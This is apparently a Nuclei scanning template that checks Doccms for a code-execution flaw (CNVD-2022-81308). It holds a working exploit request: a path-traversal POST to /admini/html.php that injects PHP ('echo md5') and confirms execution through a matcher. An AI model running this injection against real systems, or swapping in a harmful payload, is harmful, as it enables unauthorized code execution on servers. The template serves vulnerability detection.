id: doccms-admini-html-rce
info:
  name: Doccms /admini/html.php Code Execution Vulnerability (CNVD-2022-81308)
  author: ProjectDiscoveryAI
  severity: critical
  tags: rce,CNVD-2022-81308
  reference: []

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - raw:
      - |
        POST /admini/html.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        m=/../../../admini/views/system/lang/editTags.php&tags=1);echo md5({{t1}});//
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
